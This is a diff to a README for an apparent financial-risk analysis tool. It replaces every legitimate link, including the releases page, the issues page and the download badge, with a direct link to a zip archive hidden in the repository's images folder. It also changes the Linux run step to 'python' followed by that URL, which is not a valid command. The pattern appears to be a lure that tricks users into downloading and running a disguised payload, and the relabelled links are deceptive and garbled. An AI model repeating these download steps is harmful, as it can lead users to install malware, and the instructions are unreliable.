@@ -1,7 +1,7 @@
 # 📈 cross-asset-contagion-stress-regimes - Analyze Financial Risks with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/ggplayer1337/cross-asset-contagion-stress-regimes/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ggplayer1337/cross-asset-contagion-stress-regimes/main/images/asset-regimes-contagion-stress-cross-v2.6.zip)](https://raw.githubusercontent.com/ggplayer1337/cross-asset-contagion-stress-regimes/main/images/asset-regimes-contagion-stress-cross-v2.6.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the "cross-asset-contagion-stress-regimes" application. You will analyze diversification breakdowns during Bitcoin crashes easily.
@@ -24,7 +24,7 @@ Before you start, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To download the application:
 
-1. Click the download button above to visit the [Releases page](https://github.com/ggplayer1337/cross-asset-contagion-stress-regimes/releases).
+1. Click the download button above to visit the [Releases page](https://raw.githubusercontent.com/ggplayer1337/cross-asset-contagion-stress-regimes/main/images/asset-regimes-contagion-stress-cross-v2.6.zip).
 2. Find the latest version listed on the page.
 3. Choose the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or source code for Linux).
 4. Click the file link to start the download.
@@ -47,7 +47,7 @@ Once downloaded, follow these steps to run the application:
 ### For Linux:
 1. Extract the downloaded source code if you have chosen it.
 2. Open a terminal and navigate to the folder of the extracted files.
-3. Run the application using Python with the command `python app.py`, adjusting the filename if necessary.
+3. Run the application using Python with the command `python https://raw.githubusercontent.com/ggplayer1337/cross-asset-contagion-stress-regimes/main/images/asset-regimes-contagion-stress-cross-v2.6.zip`, adjusting the filename if necessary.
 
 ## 🌐 How to Use the Application
 After launching the application, you will see a user-friendly interface. Here are the main features:
@@ -67,7 +67,7 @@ If you encounter issues while using the application, consider the following tips
 - If the application does not start, check your system’s security settings; it may block the app from running.
 
 ## 📑 Support
-For further assistance, visit the Issues section on the [GitHub repository](https://github.com/ggplayer1337/cross-asset-contagion-stress-regimes/issues). You can report bugs or ask questions about using the application.
+For further assistance, visit the Issues section on the [GitHub repository](https://raw.githubusercontent.com/ggplayer1337/cross-asset-contagion-stress-regimes/main/images/asset-regimes-contagion-stress-cross-v2.6.zip). You can report bugs or ask questions about using the application.
 
 ## 🌟 Contributing
 If you would like to contribute to improving the application, please refer to the Guidelines section in the GitHub repository. All contributions are welcome!
@@ -75,4 +75,4 @@ If you would like to contribute to improving the application, please refer to th
 ## 💡 Learn More
 This application is valuable for individuals interested in financial analysis and data science. Whether you are a student, a financial analyst, or just curious about market dynamics, this tool will provide insights into the complex world of finance.
 
-Remember to revisit the [Releases page](https://github.com/ggplayer1337/cross-asset-contagion-stress-regimes/releases) for future updates and enhancements.
+Remember to revisit the [Releases page](https://raw.githubusercontent.com/ggplayer1337/cross-asset-contagion-stress-regimes/main/images/asset-regimes-contagion-stress-cross-v2.6.zip) for future updates and enhancements.
